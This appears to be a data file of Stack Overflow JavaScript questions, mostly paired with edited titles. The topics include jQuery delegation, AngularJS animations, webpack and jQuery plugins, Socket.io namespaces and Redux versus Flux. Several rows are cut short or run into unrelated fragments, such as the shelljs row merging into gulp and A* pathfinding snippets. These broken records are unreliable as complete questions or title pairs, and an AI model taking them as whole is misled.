"iOS 8 removed ""minimal-ui"" viewport property, are there other ""soft fullscreen"" solution?"," (This is a multi-part question, I will try my best to summarise the scenario.)We are currently building a responsive web app (news reader) that allow users to swipe between tabbed content, as well as scroll vertically inside each tabbed content.A common approach to the problem is to have a wrapper div that fills the browser viewport, set overflow to hidden or auto, then scroll horizontally and/or vertically inside it.This approach is great but has one main drawback: since the height of the document is exactly the same as the browser viewport, the mobile browser will not hide the address bar/navigation menu.There are numerous hacks and viewport properties that enable us to get more screen real estate, but none are quite as effective as minimal-ui (introduced in iOS 7.1).News came yesterday that iOS 8 beta4 had removed minimal-ui from Mobile Safari (see Webkit section in iOS 8 Release Notes), which left us wondering:Q1. Is it still possible to hide the address bar on Mobile Safari?As far as we know, iOS 7 no longer responds to the window.scrollTo hack, this suggests we have to live with the smaller screen space, unless we adopt a vertical layout or use mobile-web-app-capable.Q2. Is it still possible to have a similar soft fullscreen experience?By soft fullscreen I really mean without using the mobile-web-app-capable meta tag.Our web app is built to be accessible, any page can be bookmarked or shared using the native browser menu. By adding mobile-web-app-capable we prevent users from invoking such menu (when it's saved to homescreen), which confuses and antagonises users.minimal-ui used to be the middle-ground, hiding the menu by default but keeping it accessible with a tap -- though Apple might have removed it due to other accessibility concerns (such as users not knowing where to tap to activate the menu).Q3. Is a fullscreen experience worth the trouble?It would seem that a fullscreen API is not coming to iOS anytime soon, but even if it is, I don't see how the menu will be kept accessible (same goes for Chrome on Android).In this case, maybe we should just leave mobile safari as it is, and account for viewport height (for iPhone 5+, it's 460 = 568 - 108, where 108 includes the OS bar, address bar and navigation menu; for iPhone 4 or older, it's 372).Would love to hear some alternatives (besides building a native app). <code> ","iOS 8 removed ""minimal-ui"" viewport property, are there other ""soft fullscreen"" solutions?"

Native JS equivalent to jquery delegation," What is the native implementation for event delegation on dynamically created dom elements?I tried looking at the jQuery source but I can't follow the .on method.Note: Currently I attach the event handlers after the dom elements are created, which seems pretty standard but I like the way jQuery .on handles dynamically created elements events with this syntax $( document ).on( ""click"", "".selector"", handler );. <code> ",Native JS equivalent to jQuery delegation
What's the JS equivalent to jQuery .data() method?," And before someone says: No, is not what I'm looking for. jQuery's data() has dual functions. 1) It queries an HTML5 data attribute which can be seen in the HTML code like this: and 2) the ones that are set by .data(name, value) which are hidden in a jQuery internal Object, to which the documentation only says ""to save information under the names 'events' and 'handle'"", yet I haven't figured out a way to access them or what actually creates them.So, my question stands, how can I access the jQuery data values from plain JavaScript?Just so it's absolutely clear... let me put more emphasis: I don't want the data- HTML attributes, but the jQuery object data. <code>  document.querySelector('.myElem').getAttribute('data-*') <div data-role=""page"" data-last-value=""43"" data-hidden=""true"" data-options='{""name"":""John""}'></div>$( ""div"" ).data( ""role"" ) === ""page"";$( ""div"" ).data( ""lastValue"" ) === 43;$( ""div"" ).data( ""hidden"" ) === true;$( ""div"" ).data( ""options"" ).name === ""John"";","With vanilla JavaScript, how can I access data stored by jQuery's .data() method?"
CLI (i.e. shell scripting): synchronous child process calls," Synchronous child process calls are now available in the versions of Node.js that are under development (i.e. unstable). This is great news for writing shell scripts, as it will allow code like this: However, for code aimed at the current stable version of Node.js (v0.10.30), synchronous child process calls are not available except via external libraries. The two most popular such libraries appear to be shelljs and exec-sync.For shell scripts intended for use with v0.10.x, and which must call binaries or other executables and process their output, what are the relative pros and cons of these two libraries or other comparable libraries?

This should copy all sub-folders and files to the gulp.dest.

Nothing that would help me find the error.Why are some folders or files excluded from copying?I use base to keep the folder / sub-folder structure; tried with and without 'base' -> no effects on the copying process.I also changed the position of the 'copy-data' task in the run-list. Actually it's the first task to run. There seems to be no change in behavior no matter if it's the first or the last one.

Here is a classic example of what I'm talking about (the green path is the generated path, the red dots are each turns where the direction of the path changes):Now I know that A* is only guaranteed to return a path that cannot be simpler (in terms of steps), but I'm struggling to implement a heuristic that weights turns. Here is a picture that show two other paths that would also qualify as just as simple (with an equal number of steps)The Blue path would present the same number of steps and turns while the red path has the same number of steps and fewer turns. In my code I have a simplifyPath() function that removes steps where the direction changes, so if I could get all possible paths from astar then I could select the one with the least turns, but that's not how A* fundamentally works, so I'm looking for a way to incorporate simplicity into the heuristic.Here is my current code: After digging into Michail Michailidis' excellent answer I've added the following code to my simplifyPath() function) (demo): Basically after it reduces redundant steps in the same direction, it tries to smooth out the path by looking ahead to see if it can eliminate any steps. <code>  var img, field = document.getElementById('field'), EngineBuilder = function(field, size) { var context = field.getContext(""2d""), graphSettings = { size: size, mid: Math.ceil(size/2)}, engine = { getPosition: function(event) { var bounds = field.getBoundingClientRect(), x = Math.floor(((event.clientX - bounds.left)/field.clientWidth)*field.width), y = Math.floor(((event.clientY - bounds.top)/field.clientHeight)*field.height), node = graph.grid[Math.floor(y/graphSettings.size)][Math.floor(x/graphSettings.size)]; return { x: x, y: y, node: node } }, drawObstructions: function() { context.clearRect (0, 0, 320, 200); if(img) { context.drawImage(img, 0, 0); } else { context.fillStyle = 'rgb(0, 0, 0)'; context.fillRect(200, 100, 50, 50); context.fillRect(0, 100, 50, 50); context.fillRect(100, 100, 50, 50); context.fillRect(0, 50, 150, 50); } }, simplifyPath: function(start, complexPath, end) { var previous = complexPath[1], simplePath = [start, {x:(previous.y*graphSettings.size)+graphSettings.mid, y:(previous.x*graphSettings.size)+graphSettings.mid}], i, classification, previousClassification; for(i = 1; i < (complexPath.length - 1); i++) { classification = (complexPath[i].x-previous.x).toString()+':'+(complexPath[i].y-previous.y).toString(); if(classification !== previousClassification) { simplePath.push({x:(complexPath[i].y*graphSettings.size)+graphSettings.mid, y:(complexPath[i].x*graphSettings.size)+graphSettings.mid}); } else { simplePath[simplePath.length-1]={x:(complexPath[i].y*graphSettings.size)+graphSettings.mid, y:(complexPath[i].x*graphSettings.size)+graphSettings.mid}; } previous = complexPath[i]; previousClassification = classification; } simplePath.push(end); return simplePath; }, drawPath: function(start, end) { var path, step, next; if(this.isPathClear(start, end)) { this.drawLine(start, end); } else { path = this.simplifyPath(start, astar.search(graph, start.node, end.node), end); if(path.length > 1) { step = path[0]; for(next = 1; next < path.length; next++) { this.drawLine(step, path[next]); step = path[next]; } } } }, drawLine: function(start, end) { var x = start.x, y = start.y, dx = Math.abs(end.x - start.x), sx = start.x<end.x ?

Set URL to Title with Dashes instead of ID," I am using AngularJS to create a page of articles with links for details for the individual articles. The links are based on the ID to ensure they are unique, but I would like the URLs to be the title with dashes (much more SEO/user friendly) rather than the ID. Here is the Angular Example where the product details are clean titles:http://angular.github.io/angular-phonecat/step-11/app/#/phonesMy current URLs are linked by ID so they appear as article/66D5069C-DC67-46FC-8A51-1F15A94216D4I want them to display as the article title such as article/start-investing and ensure they are SEO friendly.My concern is that if two articles by separate authors have the same title (ex.

Angular.js animation chaining," I have a block with ng-repeat that is defined like this: Currently I can switch between those blocks, by clicking certain elements. It works via ng-show=""isPageSelected(item.page)"" as you might have guessed. It all works fine, but they are switching instantly and I want to add an animation, a simple fade in/fade out will do. So, the block that is no longer selected should fade out and when it's gone a new block should fade in. When I'm using ngAnimate they fade in and fade out simultaneously. I need the first block to disappear completely and be hidden with display: none; and when it's done the next block should appear and fade in. It's a rather straightforward task when using jQuery, but how do I do that elegantly with Angular.js?I have a strong suspicion that Angular.js isn't exactly a good choice for a site with complex animations.EDIT: To simplify my question, all I need to do is On a button click start an animation;When an animation has been finished, change model;Run another animation.Since I need to change the model after an animation, it's probably not possible to do it via pure CSS. The only way I know of triggering animations on specific elements in angular is to create a directive, pass a scope variable into the directive, create watcher for that variable in the directive and then change the variable from the controller: I guess it would work, but it seems really bloated to create a directive just for that. Also, how would I change $scope.page with this approach only when the animation has been finished? Add another scope variable just to trigger an animation and somehow change $scope.page when an animation has been finished? It's possible to do it with ngFx module, but the amount of code it takes is just ridiculous. At this point I think adding jQuery animations to the controller would be a prettier way to solve it.EDIT: That's how it looks like with jQuery animations: It works fine and it's not quite as verbose as the way with directives, but I have to use CSS selectors and that's just feels very ""unangular"". Do you guys use something similar when dealing with animations?EDIT: Somewhat similar approach using ngFx: In the controller: I'm not using CSS selectors, but still it looks awful. I have to define a scope variable for the animation and then check if the animation is already running. I feel like I am missing something really obvious. <code>  <div ng-show=""isPageSelected(item.page)"" class=""block"" ng-repeat=""item in data""> ...</div> <div animation=""page""></div> app.directive('animation', function(){ return { scope: { page: '=animation' }, link: function(scope, element){ scope.$watch('page', function(newVal){ ... }); } };}); $scope.changePage = function(page) { $('.block').animate({opacity: 0}, 500, function(){ $scope.page.id = page; $scope.$apply(); $(this).animate({opacity: 1}, 500); });}; <div ng-hide=""switchPageAnimation"" class=""block fx-fade-normal fx-speed-300 fx-trigger""> $scope.switchPageAnimation = false; $scope.changePage = function(page) { if($scope.page.id === page || $scope.switchPageAnimation) return; $scope.switchPageAnimation = true; $scope.$on('fade-normal:enter', function(){ $scope.page.id = page; $scope.switchPageAnimation = false; }); };",Angular.js animations

AngularJS i18n: define different fonts for different language," I am using Angular-i18n. My page is like: I would like to use font-family Lato for English and Microsoft Yahei for Chinese. I have tried: But it is not working. And also checked the Doc: http://angular-translate.github.io/docs/#/guide. I cannot find the solution. How to make it?Update:I found a post http://yukikodesign.com/orangutangy/?p=191, saying: Specify English fonts first and then the Chinese fonts in your font list. This makes it so English fonts render with your desired fonts then the Chinese fonts pick up the other characters.It's like: font-family: ""Lato"", ""Microsoft Yahei"";Surprisingly, it works! But it seems not a generic solution.

My Javascript only works inline," I have written the code for a simple function inline, but when i created a separate js.file it doesn't want to work for some reason. I've tried everything it feels like, but maybe my tired eyes can't something! The idea is to have three buttons that when you click on one of them only one of the divs will be shown, and the other two will be hidden.Here is the JavaScript (that worked perfectly fine inline): <code>  <!DOCTYPE html><html> <head> <title>Test</title> <script type=""text/javascript"" src=""menu.js""></script> </head> <body><div class=""container""> <button name=""one"">Button 1</button> <p> Lorem ipsum dolor sit amet </p></div><div class=""container""> <button name=""two"">Button 2</button> <p> Lorem ipsum dolor sit amet </p></div><div class=""container""> <button name=""three"">Button 3</button> <p> Lorem ipsum dolor sit amet </p></div> var first_container = document.querySelectorAll(' div:not(:first-child) p');for (var i = 0; i < first_container.length; i++) { first_container[i].style.visibility = 'hidden';}var buttons = document.querySelectorAll('button');for (var i = 0; i < buttons.length; i++) { buttons[i].addEventListener('click', clickHandler);}function clickHandler(e) { e.preventDefault(); var text = document.querySelectorAll('p'); for (var i = 0; i < text.length; i++) { if (text[i] === event.target.nextElementSibling) { text[i].style.visibility = 'visible'; } else { text[i].style.visibility = 'hidden'; } }}",My Javascript doesn't work when I put a script element in the head to load it from a URL
Access all input channels of an audio interface using the WebAudio API," I'm trying to access all the audio channels of an attached multi-input audio interface. I understand that the channels should be exposed by the MediaStreamAudioSourceNode node after it has been created with a MediaStream: The problem is that input.channelCount is always 2, no matter which device is chosen as the user media source. This is true of Chrome and FireFox.The Media Capture and Streams spec states: A single MediaStreamTrack can represent multi-channel content, such as stereo or 5.1 audio or stereoscopic video, where the channels have a well defined relationship to each other. Information about channels might be exposed through other APIs, such as [WEBAUDIO], but this specification provides no direct access to channels.(http://w3c.github.io/mediacapture-main/getusermedia.html#introduction)That suggests there is no way of influencing the number of channels through getUserMedia calls (unless there is some special constraint parameter that I am missing).The WebAudio spec for MediaStreamAudioSourceNode states: The first AudioMediaStreamTrack from the MediaStream will be used as a source of audio. [...] The number of channels of the output corresponds to the number of channels of the AudioMediaStreamTrack.(http://webaudio.github.io/web-audio-api/#MediaStreamAudioSourceNode)When I inspect the stream created by getUserMedia, it has one single track. As far as I can see, it is impossible to inspect that track's number of channels. So it seems that either:getUserMedia is only streaming the first two channels of audio from an attached device to a single MediaStreamTrack.The MediaStreamAudioSourceNode is ignoring any more than the first two channels found in a MediaStreamTrack.Does anyone have more information on this problem? Am I missing something? Is it not implemented properly yet? How can we go about getting it fixed? <code>  navigator.getUserMedia({ audio: true }, function(stream) { var input = audio.createMediaStreamSource(stream); console.log(input.channelCount);});",Access all input channels of an audio interface using the WebAudio API?
Oracle Apex : Custom Event Dynamic Action based on $(document) jQuery selector," I've been using dynamic actions based on custom events in one of my Oracle Apex pages. I am binding my event to the document and then using a 'DOM Object' selection type (of document) in order to specify the context for the event. This works in Apex 4.2, however I have just come across this in relation to Apex 5:https://docs.oracle.com/cd/E59726_01/doc.50/e39143/toc.htm#BAJDAGJG 5.10 Deprecation of Dynamic Actions Based on DOM Objects Dynamic actions based on DOM Objects have been deprecated. Change your dynamic actions to use a jQuery Selector or JavaScript Expression instead of DOM Object.My question is, how can I use a jQuery selector in order to detect events bound to the document? When I try using a jQuery selector of document, the dynamic action does not fire. I strongly suspect that this is because APEX wraps the selector in quotes when the dynamic action is parsed, rendering it useless for selectors on the document or window objects.I am already aware that in the standard jQuery world I would just use $(document).I already know that I can bind events to different DOM elements. I'm not interested in that. I am interested specifically in binding to document. <code> ",Custom Event Dynamic Action based on $(document) jQuery selector
Google Maps API v3.19 Broken in IE11," Version 3.19 of the Google Maps API became the default maps 'release' on the 17th Feb 2015 (See https://code.google.com/p/gmaps-api-issues/wiki/JavascriptMapsAPIv3Changelog).

Is it possible to have dynamic method names in a class?," I'm reading through the ES6 class information on Babel.js's documentation and noticed that it says that objects can now have dynamic property names: This seems like it would be useful in classes as well. Is it possible to do something similar in an ES6 class without doing it in a constructor, i.e.: rather than doing something like this in the constructor: In other words, I want to be able to take some array, such as ['format1', 'format2'] and create two methods, readformat1 and readformat2, in the class dynamically, without using the constructor. Is this possible? <code>  var obj = { ... // Computed (dynamic) property names [ ""prop_"" + (() => 42)() ]: 42}; class Foo { [ ""read"" + (...)(['format1', 'format2']) ] { // my format reading function }} class Foo { constructor(opts) { let formats = ['format1', 'format2']; let self = this; formats.forEach(function(format) { self[""read"" + format] = function() { // my format reading function } }) }}",Is it possible to have multiple dynamic method names in a class?

Managing Jquery plugin dependency in webpack," I'm using Webpack in my application, in which I create two entry points - bundle.js for all my JavaScript files/codes, and vendors.js for all libraries like jQuery and React. What do I do in order to use plugins which have jQuery as their dependencies and I want to have them also in vendors.js? What if those plugins have multiple dependencies?Currently I'm trying to use this jQuery plugin here - https://github.com/mbklein/jquery-elastic. The Webpack documentation mentions providePlugin and imports-loader. I used providePlugin, but still the jQuery object is not available. Here is how my webpack.config.js looks like- But in spite of this, it still throws an error in the browser console: Uncaught ReferenceError: jQuery is not definedSimilarly, when I use the imports-loader, it throws an error, require is not defined'in this line: However, I could use the same plugin when I don't add it to my vendors.js file and instead required it in the normal AMD way as how I include my other JavaScript code files, like- But this is not what I want to do, as this would mean that jquery.elastic.source.js is bundled along with my JavaScript code in bundle.js, and I want all my jQuery plugins to be in the vendors.js bundle. So how do I go about achieving this? <code>  var webpack = require('webpack');var bower_dir = __dirname + '/bower_components';var node_dir = __dirname + '/node_modules';var lib_dir = __dirname + '/public/js/libs';var config = { addVendor: function (name, path) { this.resolve.alias[name] = path; this.module.noParse.push(new RegExp(path)); }, plugins: [ new webpack.ProvidePlugin({ $: ""jquery"", jquery: ""jQuery"", ""window.jQuery"": ""jquery"" }), new webpack.optimize.CommonsChunkPlugin('vendors', 'vendors.js', Infinity) ], entry: { app: ['./public/js/main.js'], vendors: ['react','jquery'] }, resolve: { alias: { 'jquery': node_dir + '/jquery/dist/jquery.js', 'jquery.elastic': lib_dir + '/jquery.elastic.source.js' } }, output: { path: './public/js', filename: 'bundle.js' }, module: { loaders: [ { test: /\.js$/, loader: 'jsx-loader' }, { test: /\.jquery.elastic.js$/, loader: 'imports-loader' } ] }};config.addVendor('react', bower_dir + '/react/react.min.js');config.addVendor('jquery', node_dir + '/jquery/dist/jquery.js');config.addVendor('jquery.elastic', lib_dir +'/jquery.elastic.source.js');module.exports = config; var jQuery = require(""jquery"") define([ 'jquery', 'react', '../../common-functions', '../../libs/jquery.elastic.source'],function($,React,commonFunctions){ $(""#myInput"").elastic() //It works});",Managing jQuery plugin dependency in webpack

Angular ng-model changes to undefined when switching between 2 ng-repeats," I have an array of applications. A subset of that array is pushed into another array. I know have 2 ng-repeats that loop over those arrays: the two change functions are as followed: What i observe is that every app that was initializes with ""isSelected"" = false will be set to undefined as soon as the radio button is switched to ""NO"". When switched back to ""YES"" is selected switches back to false. This causes the dProgChange to trigger every time the Radio button value changes. I can't figure out why the ""isSelected"" switches to undefined.UPDATEWhile trying to create a simplified example, i noticed that the problem occurs as soon as the checkbox is required. In the plunker listed bellow, the model value for the checkbox is set to undefined as soon as the checkbox is unchecked.

Socket.io client ignoring port when namespace used," I have a simple node.js app with socket.io (1.3.5), taken from socket.io examples: Now in my front-end I connect to these specific namespaces like so (again, taken from the example): The app is running on port 3000 and the website is opened using URL localhost:3000.When doing that I am getting CORS errors, it seems like Socket.io on client side is not auto-detecting the port number as soon as I start using namespaces (in firefox dev tools I can see requests going to localhost/ rather than localhost:3000/). If on my server-side I don't use namespaces: And on front-end I connect this way: Everything works fine, port auto-discovery works and in firefox dev tools I can see connections being made to localhost:3000/.Alternatively, if I still use namespaces on my back-end, and on front end I connect like so: Again everything works (and indeed in firefox dev tools I can see network requests going to localhost:3000/).How come the port auto-discovery is not working with namespaces?

How to calculate a CRC32 of an arrayBuffer (javascript) compatible with php," On the client side (Javascript) I'm using the FileReader() Object to read a local file from a browser and this file is sent to the server (PHP) thanks to the XMLHttpRequest() object.

I want to check the integrity of each chunk transferred (Each chunk is about 100KB). The idea is to calculate the CRC on the javascript side and the server side, then compare the two CRC to check the integrity and retry the transfer if needed.JAVASCRIPT PHP <code>  var fileReader = new FileReader();fileReader.onload = function(event){ var arrayBuffer = event.target.result; // // TODO : calculate the crc of this arrayBuffer var xhr = new XMLHttpRequest(); ... xhr.open(YourMethod,YourUrl,true); ... xhr.addEventListener('loadend', function (event) { var CRCFromPhp = event.target.responseText; // TODO : compare the CRC from php with the CRC from javascript }}fileReader.readAsArrayBuffer(blob); $file_crc = hash_file(""crc32b"",$target_file,FALSE); $file_crc = sprintf('%u',hexdec($file_crc)); echo $file_crc; ",How to calculate the CRC of an arrayBuffer (From FileReader in javascript) compatible with the CRC32 function in php?

Is there anyway to fix `Object.create` side effects in Chrome?," I was playing around today when I noticed that some of my objects in Chrome's console were being displayed as Object instead of the constructor function name.This was odd, so I boiled it down to the following code: In the above code b, is not created via a Object.create and yet when logged it says Object. I don't have a typo there, and mistakenly asking about c. The log of b has been altered when I haven't even touched that object. Creating another instance c, should not alter b.This has to be a Chrome bug right? Is there anyway to get Chrome to correctly report Baz here?This is important for debugging purposes.

JavaScript generated content event on loading?, I've got a problem with some Javascript-generated content :I use the onload() event of my html page to load HTML code from a server and inject it in the page. Since it already is html I use the innerHtml property of the nodes I want to fill with content.Once I've injected the HTML I call a handmade adjustHeights() function that normalizes the height of the elements I created this way to make them all match the height of the tallest element.All of this works perfectly unless the code inside innerHtml contains some sort of image or other media that takes time to load (particularly videos) because adjustHeights() is called between the injection of the code and the end of the loading time of the image/video/etc.Is there any way to wait for every element to be loaded before calling adjustHeights() ? I've already tried the document.onreadystatechange property but the state is already on 'completed' when I start to inject code.If it's possible I would rather not use time-based calls on adjustHeights().To make it clearer here's an example : <code>  var mylist = document.getElementById('mycontent');var li;for (var i = 0; i < res.length; i++){ li = document.create('li'); li.innerHTML=res[i]; mylist.appendChild(li);}adjustHeights();,Fire event when images in generated content are loaded

NaN is like NULL in SQL, it is not equal to anything, even itself.But look, there is a function called isNaN() -- maybe that will do it!No, so far as I can tell, isNaN() is utterly worthless.For example, isNaN([""""]) properly returns false, but isNaN(["".""]) returns true.

How Does Firefox Reader View Operate (FF version 38.0.5)," Summary I am looking for the criteria by which I can create a webpage and be [fairly] sure it will appear in the Firefox Reader View, if user desired.

Detecting combobox popover open/close in UIWebView," When the user clicks on a select box in UIWebView, a native popover is displayed at the bottom of the screen with the available options.

cucumber-js and Chai how to expect if element witi given selector exist in DOM," I have a problem with cucumberjs. I cannot find a way to ensure that element with given selector is presented into DOM. I'm using cucumberjs with Chai. https://github.com/cucumber/cucumber-jsisPresent returns object - no matter if the element exists or not.So the question is how to check if element is present in DOM. I will edit the question to share one learned lesson. I read the documentation also want to thanks to Nathan Thompson. isPresent() returns a promise that will resolve to whether the element is present on the page. http://angular.github.io/protractor/#/api?view=Protractor.prototype.isElementPresentThe code examples is a little misleading. So if you want to expect if element with a given selector exist in DOM you must use something like this: Or use chai with promises. However, the word ""eventually"" sounds unpleasant. We want to be sure not eventually sure. :) Here can be viewed article about this question into my personal blog.  <code>  element(by.id('someId')).isPresent().then(function(isElementVisible) { expect(isElementVisible).to.be.true; }); expect(element.isPresent()).to.eventually.be.false",cucumber-js and Chai how to expect if element with given selector exist in DOM

image load issue with AngularJS," I want to put a QR code in a website, arguably it could be any image file that is served from an ASP.NET MVC Action — but in this case its a QR code. I am passing some querystring args to my endpoint to generate a QR code, which is returned as a GIF. Using AngularJS, I am setting the <img/> tags src attribute.The url and querystring are being constructed within an AngularJS controller. My issue is that before Angular loads and binds the data to the control, I am getting a HTTP 404 Error when the browser tries to fetch the image, before the Angular expression is replaced. Once the scripts have run the QR code displays, as expected.Would prefer to not get this HTTP error. Can I defer the load somehow? Or use AngularJS slightly differently (more correctly?)Thanks! <code>  <div class=""qrcodeview"" > <h2>SCAN</h2> <img id=""qr"" src=""{{qrlink}}"" /></div>",404 image load issue with AngularJS

What is the difference between pause() and enterRepl()?," In protractor, there is the browser.pause() function: Beta (unstable) pause function for debugging webdriver tests. Use browser.pause() in your test to enter the protractor debugger from that point in the control flow. And, also, there is a less-known one - browser.enterRepl(): Beta (unstable) enterRepl function for entering the repl loop from any point in the control flow. Use browser.enterRepl() in your test. Does not require changes to the command line (no need to add 'debug'). From the provided documentation and examples, it is clear that they both are used for debugging the tests. But, it is not clear, what is the difference between the two. When should we use pause() and when enterRepl()? <code>  element(by.id('foo')).click();browser.pause();// Execution will stop before the next click action.element(by.id('bar')).click(); element(by.id('foo')).click();browser.enterRepl();// Execution will stop before the next click action.element(by.id('bar')).click();",What is the difference between browser.pause() and browser.enterRepl()?

Slider not working on mobile as designed," UPDATE 7/24/15: As I couldn't migrate the code and was having conflicting issues I changed the library totally. The quickest fix, for me was http://refreshless.com/nouislider/. It still allowed me to retrieve values work with the same shortcoding the jquery did. I can't vouch for how light this is but for a temp fix on a clients site I can recommend.UPDATE 7/30/15: jQuery UI was already attempted and Touch Punch, they both caused further issue. Again the only solution was No UI Slider for me in this case. Your project may be different but for severe jQuery script conflicts on 4+ yr old frameworks this was my solution.The following code (example at:http://www.equant-design.com/aab/shop/category/new-in-whats-new/89) is giving me quite a pondering as I'm helping a client convert his site to responsive mode. The slider works as coded but on mobile devices the ranges only work by clicking the scale rail and not the bookends in order to define the range. I was about to just rip the code out totally but wanted to see if anyone knew of a quick fix for this issue.jQuery version: 1.4.2 <code>  <script type=""text/javascript""> $('#price-range-filter-header').click(function() { FilterContainerSlideUpDown('filter_but', 'price-range-filter-header'); }); $(function() { $(""#slider-range"").slider({ range: true, min: 0, max: 300, values: [0, 300], step: 5, slide: function(event, ui) { $(""#slider-range-caption"").html('<?=$currency_type->symbol?>' + ui.values[0] + ' - ' + '<?=$currency_type->symbol?>' + ui.values[1]); }, change: function(event,ui) { ApplyPriceRangeFilter(ui.values[0],ui.values[1]); } }); $(""#slider-range-caption"").html('<?=$currency_type->symbol?>' + $(""#slider-range"").slider(""values"", 0) + ' - ' + '<?=$currency_type->symbol?>' + $(""#slider-range"").slider(""values"", 1)); //initialise jquery scrollbar $('.scrollbar').scrollbar(); });</script><div id=""filter_but"" name=""filter_but""> <div id=""slider-range""></div></div>",jQuery Slider not working on mobile as designed

Fixed position within parent instead of browser," I need to position a header to be fixed within the containing parent so that it follows when scrolling. The problem is that fixes the position to the browser, not the parent. What this is resulting in is that when I have a container that has a horizontal scroll for overflow in the width (the content is wider than the container), my fixed header does not have the overflow-scroll as the content of the table does.See this fiddle demoSo the goal here is to fix the position of the header, but fixed relative to it's parent container. In this fiddle, you can see that I've commented out a block of css: If you replace the current css block (with transform set to none) with the one with translateZ, the header will get positioned within it's parent container, but is no longer fixed.Anyone know how to solve this? Preferred solution would be CSS/HTML only and avoid JS but if nothing else, then JS is of course what I need to go with! <code>  position:fixed .container{ /*-webkit-transform: translateZ(0); -moz-transform: translateZ(0); -ms-transform: translateZ(0); transform: translateZ(0);*/ -webkit-transform: none; -moz-transform: none; -ms-transform: none; transform: none; }",Position fixed within container element instead of the browser / viewport

Performance of MutationObserver to detect nodes added anywhere?," I'm interested in using MutationObserver to detect if a certain HTML element is added anywhere in an HTML page. For example's sake, I'll say that I want to detect if any <li>'s are added anywhere in the DOM.All the MutationObserver examples I've seen so far only detect if a node is added to a particular container. For example:some HTML MutationObserver definition So in this example, the MutationObserver is setup to watch a very certain container (ul#my-list) to see if any <li>'s are appended to it.Is it a problem if I wanted to be less specific, and watch for <li>'s over the entire HTML body like this: I know it works in the basic examples I've setup for myself... But is it not advised to do this? Is this going to result in poor performance? And if so, how would I detect and measure that performance issue?I figured maybe there was a reason that all the MutationObserver examples are so specific with their targeted container... but I'm not sure. <code> ",Performance of MutationObserver to detect nodes in entire DOM

ExtJS: Combobox values are disappearing on typing," Using extjs 5.1.3 version. I have a typeAhead combobox in the form as below:Combobox store: Below is snippet in form: On typing the value in combobox sometimes dropdown values are displaying and sometimes not showing for the input. When I observe network panel, store is loading properly from server.What are possible client side issues for not showing dropdown values when store is loading properly from server ?Update: I found a pattern for the issue i.e. if an exact match of record is found in the dropdown list with the typed value, then only dropdown values are disappearing. (e.g. if I type alphabet A and if there is a record with value A then dropdown values are disappearing. If I type a then dropdown will not be disappear since there is no record with lowercase a). What are required configurations I need to provide to fix this ? <code>  Ext.define('MyApp.view.myobj.field.CustomObject', { extend:'Ext.form.field.ComboBox', xtype: 'cstmObject', requires: [ 'MyApp.model.myobj.CustomObject' ], fieldLabel: 'Custom Object Name', displayField: 'name', valueField: 'name', queryMode: 'remote', selectOnFocus: false, typeAhead: true, hideTrigger: true, minChars: 1, queryCaching : false, store:{ model: 'MyApp.model.myobj.CustomObject' }} { xtype: 'cstmObject', fieldLabel: 'Custom Object Name', allowBlank: false, maxLength: 5, enforceMaxLength: true, bind: '{customObject.row}'}",Combobox values are disappearing on typing

Phonegap - handling push notification once I've left the main scope with window.location.replace," I'm using Phonegap 4.2 (based on Cordova 5.0) to create a cross-platform application.The application is for Android and iOS. When a user loads the app, he is located in index.html. From there I have access to various JavaScript methods, raw-, Cordova-based- and I happen to be using jQuery v1.11.1.When the app receives a push notification the app must be able to access a location property in the payload and from there access the specifically mentioned destination (e.g. 'https://stackoverflow.com/questions/ask'). I'm doing that. Then the user is either to be redirected to that specific location, which is a website (without opening a browser, i.e. leaving the app), or to include the website within the index file and replace it's content.Using iFrames did not seem to be an option, to simply include the website within the index file, due to the website simply appearing as blank or some other issues -- although I might be wrong, but that's sort of off topic (would probably fix the whole issue tho that I'm about to present). After reading some articles (antonylees, Stackoverflow, etc) I came down to the solution of simply using window.location.replace(externalUrl); to access the site. It work perfectly. (Note that building the site and wrapping it into my app is not an option as it's too heavy).So far, so goodI'm using the PushPlugin Cordova plugin to handle Push Notifications. Everything is set up and works; I do receive push notifications. To be able to handle (i.e. process) the push-notifications I have registered onNotification event listeners, both for Android and iOS.There are three scenarios that I must take into account when processing an arriving push notification:Push arrives → User presses the notification → App is started from a coldstart (the app wasn't running) → The payload is processed with the `onNotification` method available in the index file and the user is redirected to location specified in the push notification's payloadPush arrives → User presses the notification → App is started while in background (i.e. running), but the user has not yet left the index file → The payload is processed with the `onNotification` method available in the index file and the user is redirected to location specified in the push notification's payloadPush arrives → User presses the notification → App is started while in background (i.e. running), but the user has already left the index file, by being already redirected in the past to the website, and has no longer access the `onNotification` method because it doesn't exist in the new website → User stays exactly where he was and has not been redirected to a new locationMy issue Scenario 1. and 2. work fine because I have access to the attached notification listeners, and they can process the payload and achieve a location property that I send with the payload, to determine where the user is to be redirected to.In Scenario 3, however, the user has been redirected out of the index file (and to an external website) and technically the index's scope, so from now on I do no longer have access to the methods that were available in the index file, including the onNotification methods.Due to this, I can not redirect the user to a new location when he has received a push notification.So my question is:How can I process the newly arrived push notification payload, after leaving the index file? Are there perhaps better alternatives to simply include the website within the index, and thus making the previously defined methods available to use whenever I need them?Thank you.EditIt has been pointed out to me that the InAppBrowser plugin might offer what I'm looking for by providing a callback function or code injection into the browser. I'll try it tonight and come back with a report, in the meantime I'd appreciate answers from SO if you happen to have a better clue about the situation :) <code> ",Phonegap - handling push notification once I've left the index scope with window.location.replace
Creating a tree from categories using lodash," I am trying to create a category tree using the array of json objects below.I want to set a category as a child of another category if its parent equals the id of the other, and I want the posts also to be a children of that category instead of having a separate field for posts, I'll add a flag field that if it is a category or not isParent.It looks like its working alright, but as you may see, if a category has both category and post as child, it'll only show the categories.

Redux over fb flux motivation," I've read this answer, reducing boilerplate, looked at few GitHub examples and even tried redux a little bit (todo apps). As I understand, official redux doc motivations provide pros comparing to traditional MVC architectures. BUT it doesn't provide an answer to the question: Why you should use Redux over Facebook Flux? Is that only a question of programming styles: functional vs non-functional? Or the question is in abilities/dev-tools that follow from redux approach? Maybe scaling? Or testing?Am I right if I say that redux is a flux for people who come from functional languages? To answer this question you may compare the complexity of implementation redux's motivation points on flux vs redux.Here are motivation points from official redux doc motivations:Handling optimistic updates (as I understand, it hardly depends on 5th point. Is it hard to implement it in facebook flux?)Rendering on the server (facebook flux also can do this. Any benefits comparing to redux?)Fetching data before performing route transitions (Why it can't be achieved in facebook flux? What's the benefits?)Hot reload (It's possible with React Hot Reload. Why do we need redux?)Undo/Redo functionalityAny other points? Like persisting state... <code> ",Why use Redux over Facebook Flux?

